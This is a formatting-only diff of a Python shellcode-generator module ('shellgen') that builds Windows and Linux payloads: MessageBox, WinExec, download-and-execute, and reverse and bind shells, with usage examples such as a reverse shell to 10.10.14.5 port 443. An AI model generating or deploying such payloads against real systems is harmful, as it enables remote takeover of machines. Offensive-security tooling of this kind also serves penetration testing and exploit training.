@@ -9,8 +9,7 @@ used by the architecture-specific generators.
 from lib.color_printer import printer
 
 
-def windows_messagebox(title="Pwned", message="Hello from shellgen!",
-                       bad_chars=None):
+def windows_messagebox(title="Pwned", message="Hello from shellgen!", bad_chars=None):
     """
     Build a Windows MessageBox payload.
 
@@ -38,8 +37,7 @@ def windows_messagebox(title="Pwned", message="Hello from shellgen!",
     return {
         "bad_chars": bad_chars,
         "calls": [
-            {"api": "MessageBoxA", "dll": "user32.dll",
-             "args": [0, message, title, 0]}
+            {"api": "MessageBoxA", "dll": "user32.dll", "args": [0, message, title, 0]}
         ],
         "exit": True,
     }
@@ -63,15 +61,14 @@ def windows_winexec(command, show_window=1, bad_chars=None):
     return {
         "bad_chars": bad_chars,
         "calls": [
-            {"api": "WinExec", "dll": "kernel32.dll",
-             "args": [command, show_window]}
+            {"api": "WinExec", "dll": "kernel32.dll", "args": [command, show_window]}
         ],
         "exit": True,
     }
 
 
 def windows_download_exec(
-        url, save_path="C:\\\\windows\\\\temp\\\\payload.exe", bad_chars=None
+    url, save_path="C:\\\\windows\\\\temp\\\\payload.exe", bad_chars=None
 ):
     """
     Build a Windows URLDownloadToFileA + WinExec payload.
@@ -156,7 +153,7 @@ def windows_createprocess(command, show_window=1, bad_chars=None):
 
 
 def windows_shellexecute(
-        file_or_url, operation="open", parameters="", show_cmd=1, bad_chars=None
+    file_or_url, operation="open", parameters="", show_cmd=1, bad_chars=None
 ):
     """
     Build a Windows ShellExecuteA payload.
@@ -194,8 +191,7 @@ def windows_shellexecute(
     else:
         args.append(0)  # lpParameters (NULL)
 
-    args.extend(
-        [0, show_cmd])  # lpDirectory (NULL = current directory)  # nShowCmd
+    args.extend([0, show_cmd])  # lpDirectory (NULL = current directory)  # nShowCmd
 
     return {
         "bad_chars": bad_chars,
@@ -304,7 +300,7 @@ def windows_reverse_shell(host, port, bad_chars=None, shell="cmd.exe"):
     # Generate push instructions for shell string (reverse order)
     shell_asm = ""
     for i in range(len(shell_bytes) - 4, -1, -4):
-        chunk = shell_bytes[i: i + 4]
+        chunk = shell_bytes[i : i + 4]
         dword = int.from_bytes(chunk, byteorder="little")
 
         # Use NEG encoding: neg eax to get the value
@@ -528,7 +524,7 @@ def windows_reverse_shell_x64(host, port, bad_chars=None, shell="cmd.exe"):
 
     offset = 0
     for i in range(len(shell_bytes) - 8, -1, -8):
-        chunk = shell_bytes[i: i + 8]
+        chunk = shell_bytes[i : i + 8]
         qword = int.from_bytes(chunk, byteorder="little")
 
         # Use NEG encoding: neg rax to get the value
@@ -750,7 +746,7 @@ def windows_bind_shell(port, bad_chars=None, shell="cmd.exe"):
     # Generate push instructions for shell string (reverse order)
     shell_asm = ""
     for i in range(len(shell_bytes) - 4, -1, -4):
-        chunk = shell_bytes[i: i + 4]
+        chunk = shell_bytes[i : i + 4]
         dword = int.from_bytes(chunk, byteorder="little")
 
         # Use NEG encoding: neg eax to get the value
@@ -996,7 +992,7 @@ def windows_bind_shell_x64(port, bad_chars=None, shell="cmd.exe"):
 
     offset = 0
     for i in range(len(shell_bytes) - 8, -1, -8):
-        chunk = shell_bytes[i: i + 8]
+        chunk = shell_bytes[i : i + 8]
         qword = int.from_bytes(chunk, byteorder="little")
 
         # Use NEG encoding: neg rax to get the value
@@ -1275,8 +1271,7 @@ def linux_execve(command="/bin/sh", arch="arm", bad_chars=None, shell=None):
     }
 
 
-def linux_reverse_shell(host, port, arch="arm", bad_chars=None,
-                        shell="/bin/sh"):
+def linux_reverse_shell(host, port, arch="arm", bad_chars=None, shell="/bin/sh"):
     """
     Build a Linux reverse shell payload.
 
@@ -1342,10 +1337,8 @@ def linux_bind_shell(port, arch="arm", bad_chars=None, shell="/bin/sh"):
 # Format: "name": (function, description, [supported_architectures])
 PAYLOADS = {
     "windows": {
-        "messagebox": (windows_messagebox, "Display MessageBox dialog",
-                       ["x86", "x64"]),
-        "winexec": (windows_winexec, "Execute commands via WinExec",
-                    ["x86", "x64"]),
+        "messagebox": (windows_messagebox, "Display MessageBox dialog", ["x86", "x64"]),
+        "winexec": (windows_winexec, "Execute commands via WinExec", ["x86", "x64"]),
         "createprocess": (
             windows_createprocess,
             "Execute via CreateProcessA (flexible process creation)",
@@ -1386,8 +1379,7 @@ PAYLOADS = {
             "Native socket bind shell (listens for connections)",
             ["x86"],
         ),
-        "bind_shell_x64": (windows_bind_shell_x64, "Native socket bind shell",
-                           ["x64"]),
+        "bind_shell_x64": (windows_bind_shell_x64, "Native socket bind shell", ["x64"]),
         "bind_shell_simple": (
             windows_bind_shell_simple,
             "PowerShell bind shell (simple, spawns child process)",
@@ -1418,8 +1410,7 @@ def list_payloads():
     """Display a formatted, colorized list of all available payloads with architecture support."""
     # Print header
     printer.print_section("\n" + "=" * 70, "bold green")
-    printer.print_section("  Shellcode Generator - Available Payloads",
-                          "bold green")
+    printer.print_section("  Shellcode Generator - Available Payloads", "bold green")
     printer.print_section("=" * 70 + "\n", "bold green")
 
     # Windows payloads with architecture display
@@ -1491,15 +1482,13 @@ def list_payloads():
         "    ./shellgen.sh --platform windows --payload messagebox \\", "cyan"
     )
     printer.print_text(
-        '                  --title "Test" --message "Hello World" --arch x86',
-        "cyan"
+        '                  --title "Test" --message "Hello World" --arch x86', "cyan"
     )
 
     print()
     printer.print_text("  Windows Reverse Shell (x64):", "bold yellow")
     printer.print_text(
-        "    ./shellgen.sh --platform windows --payload reverse_shell_x64 \\",
-        "cyan"
+        "    ./shellgen.sh --platform windows --payload reverse_shell_x64 \\", "cyan"
     )
     printer.print_text(
         "                  --host 10.10.14.5 --port 443 --arch x64", "cyan"
@@ -1516,8 +1505,7 @@ def list_payloads():
 
     print()
     printer.print_text("  Python Format Output:", "bold yellow")
-    printer.print_text("    ./shellgen.sh --platform linux --payload execve \\",
-                       "cyan")
+    printer.print_text("    ./shellgen.sh --platform linux --payload execve \\", "cyan")
     printer.print_text(
         '                  --cmd "whoami" --arch arm64 --format python', "cyan"
     )
@@ -1527,16 +1515,14 @@ def list_payloads():
     # Usage hint
     printer.print_section("Usage:", "bold green")
     printer.print_text(
-        "  shellgen_cli.py --platform <platform> --payload <name> [options]",
-        "cyan"
+        "  shellgen_cli.py --platform <platform> --payload <name> [options]", "cyan"
     )
     printer.print_text("  shellgen_cli.py --help", "cyan")
 
     # Add helpful tip
     print()
     tip = "💡 TIP: Use --arch to specify target architecture (x86, x64, arm, arm64)\n         Use --format to choose output format (asm, python, c, raw, pyasm)\n         Use --bad-chars to avoid specific bytes (e.g., --bad-chars 00,0a,0d)"
-    printer.print_panel(tip, title="Quick Tips", style="cyan",
-                        border_style="cyan")
+    printer.print_panel(tip, title="Quick Tips", style="cyan", border_style="cyan")
 
     return ""  # Return empty string for backward compatibility
 
@@ -1556,12 +1542,10 @@ def get_payload_builder(platform, payload_name):
         ValueError: If platform or payload not found
     """
     if platform not in PAYLOADS:
-        raise ValueError(
-            f"Unknown platform: {platform}. Use 'windows' or 'linux'")
+        raise ValueError(f"Unknown platform: {platform}. Use 'windows' or 'linux'")
 
     if payload_name not in PAYLOADS[platform]:
-        raise ValueError(
-            f"Unknown payload '{payload_name}' for platform '{platform}'")
+        raise ValueError(f"Unknown payload '{payload_name}' for platform '{platform}'")
 
     # Return just the function (first element of tuple: function, description, archs)
     return PAYLOADS[platform][payload_name][0]
